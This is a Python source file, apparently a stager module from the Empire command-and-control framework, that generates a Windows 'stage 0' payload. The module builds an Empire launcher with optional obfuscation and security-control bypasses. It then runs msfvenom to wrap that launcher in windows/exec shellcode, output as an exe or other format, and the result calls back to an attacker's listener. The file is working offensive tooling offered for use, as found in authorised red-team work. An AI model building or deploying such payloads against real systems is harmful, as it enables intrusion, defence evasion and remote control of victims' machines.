import shlex
import subprocess

from empire.server.core.exceptions import StagerGenerationException


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Stage 0 - Cmd Exec",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                }
            ],
            "Description": "Generates windows command executable using msfvenom to act as a stage 0.",
            "Comments": [],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": False,
                "Value": "launcher.exe",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                "Required": False,
                "Value": False,
                "DependsOn": [{"name": "Language", "values": ["powershell"]}],
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use.",
                "Required": False,
                "Value": r"Token\All\1",
                "DependsOn": [
                    {"name": "Language", "values": ["powershell"]},
                    {"name": "Obfuscate", "values": ["True"]},
                ],
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
                "BypassLanguage": "powershell",
            },
            "Arch": {
                "Description": "Architecture of the .dll to generate (x64 or x86).",
                "Required": True,
                "Value": "x64",
                "SuggestedValues": ["x64", "x86"],
                "Strict": True,
            },
            "MSF_Format": {
                "Description": "Format for compiling the msfvenom payload.",
                "Required": True,
                "Value": "exe",
                "SuggestedValues": ["exe", "hex", "dword", "java", "python", "ps1"],
            },
        }

        self.main_menu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        arch = self.options["Arch"]["Value"]
        msf_format = self.options["MSF_Format"]["Value"]

        encode = True

        invoke_obfuscation = obfuscate

        if language in ["csharp", "ironpython"]:
            self.launcher = self.main_menu.stagergenv2.generate_exe_oneliner_routed(
                language=language,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
                bypasses=self.options["Bypasses"]["Value"],
            )

        elif language == "powershell":
            self.launcher = self.main_menu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=self.options["Bypasses"]["Value"],
            )

        if not self.launcher:
            raise StagerGenerationException("Error in launcher command generation.")

        return self.generate_shellcode(msf_format, arch, self.launcher)

    def generate_shellcode(self, msf_format, arch, launcher):
        print(f"[*] Generating Shellcode {arch}")

        if arch == "x64":
            msf_payload = "windows/x64/exec"
        elif arch == "x86":
            msf_payload = "windows/exec"
        else:
            # Arch is Strict, so the API rejects anything else -- but without
            # this branch msf_payload stays unbound and a direct caller gets an
            # UnboundLocalError, which stager_service does not convert.
            raise StagerGenerationException(
                f"Unsupported Arch '{arch}'; expected 'x64' or 'x86'."
            )

        msf_command = [
            "msfvenom",
            "-p",
            msf_payload,
            "-f",
            msf_format,
            f"CMD={launcher}",
        ]

        print(f"[*] MSF command -> {shlex.join(msf_command)}")
        try:
            return subprocess.check_output(msf_command)
        except FileNotFoundError as e:
            # Argv spawning raises here instead of letting the shell exit 127,
            # and stager_service only converts StagerGenerationException, so
            # without this a missing toolchain is a bare 500.
            raise StagerGenerationException(
                "msfvenom is not installed or is not on the server's PATH; it is "
                "required by the windows/cmd_exec stager."
            ) from e
        except (OSError, ValueError) as e:
            # The narrower FileNotFoundError above is not the only way an
            # operator-supplied MSF_Format can break the spawn: a NUL byte in
            # it raises ValueError("embedded null byte") and an msfvenom that
            # exists but is not executable raises PermissionError. Both are
            # bare 500s otherwise.
            raise StagerGenerationException(
                f"Could not run msfvenom for MSF_Format '{msf_format}': {e}"
            ) from e
        except subprocess.CalledProcessError as e:
            raise StagerGenerationException(
                f"msfvenom exited with code {e.returncode} for MSF_Format "
                f"'{msf_format}'; see the server console for its output."
            ) from e
